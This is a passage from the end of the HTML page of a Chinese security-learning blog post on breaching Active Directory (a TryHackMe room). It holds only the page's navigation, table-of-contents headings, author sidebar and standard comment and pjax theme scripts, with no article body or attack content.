src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/04/13/THM%E5%9F%9F%E5%AD%A6%E4%B9%A0EnumeratingActiveDirectory/" title="THM域学习EnumeratingActiveDirectory"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">THM域学习EnumeratingActiveDirectory</div></div></a></div><div class="next-post pull-right"><a href="/2024/04/12/THM%E5%9F%9F%E5%AD%A6%E4%B9%A0ActiveDirectoryBasics/" title="THM域学习ActiveDirectoryBasics"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">THM域学习ActiveDirectoryBasics</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2024/04/30/THMZeroLogon/" title="THMZeroLogon"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-04-30</div><div class="title">THMZeroLogon</div></div></a></div><div><a href="/2024/04/12/THM%E5%9F%9F%E5%AD%A6%E4%B9%A0ActiveDirectoryBasics/" title="THM域学习ActiveDirectoryBasics"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-04-12</div><div class="title">THM域学习ActiveDirectoryBasics</div></div></a></div><div><a href="/2024/04/13/THM%E5%9F%9F%E5%AD%A6%E4%B9%A0EnumeratingActiveDirectory/" title="THM域学习EnumeratingActiveDirectory"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-04-13</div><div class="title">THM域学习EnumeratingActiveDirectory</div></div></a></div><div><a href="/2024/05/21/THM%E5%9F%9F%E5%AD%A6%E4%B9%A0CredentialsHarvesting/" title="THM域学习CredentialsHarvesting"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-05-21</div><div class="title">THM域学习CredentialsHarvesting</div></div></a></div><div><a href="/2024/04/27/THM%E5%9F%9F%E5%AD%A6%E4%B9%A0ExploitingActiveDirectory/" title="THM域学习ExploitingActiveDirectory"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-04-27</div><div class="title">THM域学习ExploitingActiveDirectory</div></div></a></div><div><a href="/2024/04/25/THM%E5%9F%9F%E5%AD%A6%E4%B9%A0LateralMovementandPivoting/" title="THM域学习LateralMovementandPivoting"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-04-25</div><div class="title">THM域学习LateralMovementandPivoting</div></div></a></div></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div id="comment-switch"><span class="first-comment">Valine</span><span class="switch-btn"></span><span class="second-comment">Disqus</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Mikannse</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">277</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">70</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/mikannse/mikannse.github.io"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">暂时没有公告QAQ</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Introduction-to-AD-Breaches"><span class="toc-number">1.</span> <span class="toc-text">Introduction to AD Breaches</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#OSINT-and-Phishing"><span class="toc-number">2.</span> <span class="toc-text">OSINT and Phishing</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#NTLM-Authenticated-Services"><span class="toc-number">3.</span> <span class="toc-text">NTLM Authenticated Services</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#LDAP-Bind-Credentials"><span class="toc-number">4.</span> <span class="toc-text">LDAP Bind Credentials</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Authentication-Relays"><span class="toc-number">5.</span> <span class="toc-text">Authentication Relays</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Microsoft-Deployment-Toolkit"><span class="toc-number">6.</span> <span class="toc-text">Microsoft Deployment Toolkit</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Configuration-Files"><span class="toc-number">7.</span> <span class="toc-text">Configuration Files</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/15/pwncollegeDebuggingRefresher8/" title="pwncollegeDebuggingRefresher8">pwncollegeDebuggingRefresher8</a><time datetime="2024-10-15T14:18:42.000Z" title="发表于 2024-10-15 22:18:42">2024-10-15</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/13/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80%E5%85%AD%E5%9B%9B)%E4%B9%8BVulnHubBeelzebub/" title="打靶记录(一六四)之VulnHubBeelzebub">打靶记录(一六四)之VulnHubBeelzebub</a><time datetime="2024-10-13T13:18:03.000Z" title="发表于 2024-10-13 21:18:03">2024-10-13</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/13/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80%E5%85%AD%E4%B8%89)%E4%B9%8BVulnHubDoubleTrouble/" title="打靶记录(一六三)之VulnHubDoubleTrouble">打靶记录(一六三)之VulnHubDoubleTrouble</a><time datetime="2024-10-13T13:16:26.000Z" title="发表于 2024-10-13 21:16:26">2024-10-13</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/11/pwncollegeAssembly30/" title="pwncollegeAssembly30">pwncollegeAssembly30</a><time datetime="2024-10-10T17:05:42.000Z" title="发表于 2024-10-11 01:05:42">2024-10-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/09/pwncollege%E6%B1%87%E7%BC%96%E5%85%A5%E9%97%A8/" title="pwncollege汇编入门">pwncollege汇编入门</a><time datetime="2024-10-09T14:39:52.000Z" title="发表于 2024-10-09 22:39:52">2024-10-09</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://cdn.jsdelivr.net/gh/yjr-1100/Photobag/githubioimg/background_4k.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2024 By Mikannse</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat-btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>function loadValine () {
  function initValine () {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: '',
      appKey: '',
      avatar: 'monsterid',
      serverURLs: '',
      emojiMaps: "",
      path: window.location.pathname,
      visitor: false
    }, null))
  }

  if (typeof Valine === 'function') initValine() 
  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
}

if ('Valine' === 'Valine' || !true) {
  if (true) btf.loadComment(document.getElementById('vcomment'),loadValine)
  else setTimeout(loadValine, 0)
} else {
  function loadOtherComment () {
    loadValine()
  }
}</script><script>function loadDisqus () {
  const disqus_config = function () {
    this.page.url = 'http://mikannse.space/2024/04/12/THM%E5%9F%9F%E5%AD%A6%E4%B9%A0BreachingActiveDirectory/'
    this.page.identifier = '/2024/04/12/THM%E5%9F%9F%E5%AD%A6%E4%B9%A0BreachingActiveDirectory/'
    this.page.title = 'THM域学习BreachingActiveDirectory'
  }

  const disqusReset = () => {
    DISQUS.reset({
      reload: true,
      config: disqus_config
    })
  }

  btf.addModeChange('disqus', disqusReset)

  if (window.DISQUS) disqusReset()
  else {
    (function() { 
      var d = document, s = d.createElement('script');
      s.src = 'https://.disqus.com/embed.js';
      s.setAttribute('data-timestamp', +new Date());
      (d.head || d.body).appendChild(s);
    })();
  }
}

if ('Valine' === 'Disqus' || !true) {
  if (true) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
  else loadDisqus()
} else {
  function loadOtherComment () {
    loadDisqus()
  }
}
</script></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]

var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {

  // removeEventListener scroll 
  window.tocScrollFn && window.removeEventListener('scroll', window.tocScrollFn)
  window.scrollCollect && window.removeEventListener('scroll', scrollCollect)

  document.getElementById('rightside').style.cssText = "opacity: ''; transform: ''"
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')

  typeof disqusjs === 'object' && disqusjs.destroy()
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', (e) => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>